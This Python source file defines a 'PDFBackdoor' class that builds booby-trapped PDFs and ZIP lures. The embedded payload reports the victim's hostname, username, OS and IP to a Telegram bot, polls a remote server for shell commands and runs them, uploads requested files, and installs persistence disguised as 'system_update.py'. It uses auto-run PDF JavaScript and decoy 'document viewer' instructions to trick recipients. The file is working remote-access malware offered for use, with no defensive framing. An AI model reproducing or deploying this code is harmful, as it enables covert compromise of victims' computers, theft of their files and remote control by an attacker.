"""
PDF Generator with embedded payload for system notification
"""
import os
import base64
import tempfile
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
import zipfile

class PDFBackdoor:
    def __init__(self, bot_token, chat_id, server_url=""):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.server_url = server_url
        
    def create_payload_script(self):
        """Create the payload script that will run when PDF is opened"""
        payload = f'''
import os
import sys
import subprocess
import requests
import platform
import socket
import threading
import time
from datetime import datetime

# Bot configuration
BOT_TOKEN = "{self.bot_token}"
CHAT_ID = "{self.chat_id}"
SERVER_URL = "{self.server_url}"

def send_telegram_message(message):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage"
        data = {{
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        pass

def get_system_info():
    """Get basic system information"""
    try:
        hostname = socket.gethostname()
        username = os.getenv('USERNAME') or os.getenv('USER')
        system = platform.system()
        release = platform.release()
        
        # Get IP address
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            ip = "Unknown"
            
        return f"""
🚨 **PDF OPENED - New Target Accessed**

**System Info:**
• Hostname: `{{hostname}}`
• Username: `{{username}}`
• OS: `{{system}} {{release}}`
• IP Address: `{{ip}}`
• Time: `{{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}`

**Status:** ✅ Payload executed successfully
**Access:** Ready for remote commands
        """
    except Exception as e:
        return f"PDF opened but error getting info: {{str(e)}}"

def establish_connection():
    """Establish connection with the bot server"""
    try:
        # Send initial notification
        system_info = get_system_info()
        send_telegram_message(system_info)
        
        # Start command listener if server URL provided
        if SERVER_URL:
            start_command_listener()
            
    except Exception as e:
        send_telegram_message(f"Error establishing connection: {{str(e)}}")

def start_command_listener():
    """Start listening for commands from the bot"""
    def command_loop():
        while True:
            try:
                # Poll for commands from server
                response = requests.get(f"{{SERVER_URL}}/get_command", timeout=30)
                if response.status_code == 200:
                    command = response.text.strip()
                    if command:
                        execute_command(command)
                time.sleep(5)
            except:
                time.sleep(10)
    
    thread = threading.Thread(target=command_loop, daemon=True)
    thread.start()

def execute_command(command):
    """Execute received command"""
    try:
        if command.startswith('download:'):
            filepath = command.split(':', 1)[1]
            upload_file(filepath)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            send_telegram_message(f"Command: `{{command}}`\\nOutput:\\n```\\n{{output[:3000]}}\\n```")
    except Exception as e:
        send_telegram_message(f"Command error: {{str(e)}}")

def upload_file(filepath):
    """Upload file to Telegram"""
    try:
        if os.path.exists(filepath):
            url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendDocument"
            with open(filepath, 'rb') as file:
                files = {{'document': file}}
                data = {{'chat_id': CHAT_ID}}
                requests.post(url, files=files, data=data)
    except Exception as e:
        send_telegram_message(f"Upload error: {{str(e)}}")

def install_persistence():
    """Install persistence mechanism"""
    try:
        script_path = os.path.abspath(__file__)
        
        if platform.system() == "Windows":
            # Windows startup folder
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            persistence_script = os.path.join(startup_folder, 'system_update.py')
        else:
            # Linux/Mac crontab or autostart
            home = os.path.expanduser('~')
            persistence_script = os.path.join(home, '.system_update.py')
            
        # Copy script to persistence location
        with open(script_path, 'r') as src, open(persistence_script, 'w') as dst:
            dst.write(src.read())
            
        send_telegram_message("✅ Persistence installed successfully")
        
    except Exception as e:
        send_telegram_message(f"Persistence error: {{str(e)}}")

# Main execution
if __name__ == "__main__":
    try:
        establish_connection()
        install_persistence()
    except Exception as e:
        pass
'''
        return payload

    def create_pdf_with_payload(self, output_path, title="Important Document"):
        """Create PDF with embedded payload"""
        
        # Create the payload script
        payload_script = self.create_payload_script()
        
        # Create a temporary Python file
        temp_dir = tempfile.mkdtemp()
        payload_file = os.path.join(temp_dir, "payload.py")
        
        with open(payload_file, 'w') as f:
            f.write(payload_script)
        
        # Create PDF
        c = canvas.Canvas(output_path, pagesize=letter)
        width, height = letter
        
        # Add content to make PDF look legitimate
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, height - 50, title)
        
        c.setFont("Helvetica", 12)
        content = [
            "This document contains important information.",
            "",
            "Please ensure you have the latest software updates installed",
            "to view this document properly.",
            "",
            "If you experience any issues viewing this document,",
            "please contact technical support.",
            "",
            "Document ID: DOC-2024-SECURE-001",
            "Classification: Internal Use Only",
            "",
            "© 2024 - All Rights Reserved"
        ]
        
        y_position = height - 100
        for line in content:
            c.drawString(50, y_position, line)
            y_position -= 20
        
        # Add JavaScript action to execute payload
        # This creates an auto-open action
        js_code = f'''
        try {{
            var payload = `{base64.b64encode(payload_script.encode()).decode()}`;
            var decoded = atob(payload);
            
            // Try to execute via different methods
            if (typeof ActiveXObject !== 'undefined') {{
                // Internet Explorer method
                var shell = new ActiveXObject("WScript.Shell");
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                var tempFile = fso.GetSpecialFolder(2) + "\\\\temp_update.py";
                var file = fso.CreateTextFile(tempFile, true);
                file.Write(decoded);
                file.Close();
                shell.Run("python " + tempFile, 0, false);
            }}
        }} catch(e) {{
            // Fallback: try to trigger download
            var blob = new Blob([atob(payload)], {{type: 'text/plain'}});
            var url = window.URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'system_update.py';
            a.click();
        }}
        '''
        
        # Add the JavaScript as an annotation
        c.addJS(js_code)
        
        c.save()
        
        # Clean up
        os.remove(payload_file)
        os.rmdir(temp_dir)
        
        return output_path

    def create_executable_pdf(self, output_path, title="Document"):
        """Create PDF that auto-extracts and runs payload"""
        
        # Create payload
        payload_script = self.create_payload_script()
        
        # Create a ZIP file containing the payload
        zip_path = output_path.replace('.pdf', '.zip')
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.writestr('document_viewer.py', payload_script)
            zipf.writestr('README.txt', '''
This document requires a special viewer to display properly.

To view the document:
1. Extract all files
2. Run document_viewer.py
3. The document will open automatically

Note: Python must be installed on your system.
            ''')
        
        # Create PDF that instructs user to extract and run
        c = canvas.Canvas(output_path, pagesize=letter)
        width, height = letter
        
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, height - 50, title)
        
        c.setFont("Helvetica", 12)
        instructions = [
            "DOCUMENT VIEWER REQUIRED",
            "",
            "This document uses advanced formatting that requires",
            "a special viewer application.",
            "",
            "To view this document:",
            "1. Download the document viewer package",
            "2. Extract all files to a folder",
            "3. Run 'document_viewer.py'",
            "",
            "The document will then display properly.",
            "",
            "Download link: [Attached as ZIP file]",
            "",
            "Technical Support: support@company.com"
        ]
        
        y_position = height - 100
        for line in instructions:
            c.drawString(50, y_position, line)
            y_position -= 20
        
        c.save()
        
        return output_path, zip_path

